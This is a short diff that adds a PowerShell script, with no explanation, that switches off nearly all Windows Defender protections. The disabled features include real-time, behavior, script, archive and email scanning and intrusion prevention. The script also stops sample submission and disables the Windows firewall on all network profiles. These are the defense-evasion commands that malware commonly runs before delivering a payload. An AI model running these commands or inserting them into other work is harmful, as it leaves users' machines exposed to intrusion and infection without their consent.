@@ -1,0 +1,9 @@
+Set-MpPreference -DisableRealtimeMonitoring $true;
+Set-MpPreference -SubmitSamplesConsent 2;
+Set-MpPreference -DisableArchiveScanning $true;
+Set-MpPreference -DisableEmailScanning $true;
+Set-MpPreference -DisableBehaviorMonitoring $true;
+Set-MpPreference -DisableScriptScanning $true;
+Set-MpPreference -DisableIntrusionPreventionSystem $true;
+Set-MpPreference -DisableIOAVProtection $true;
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False;
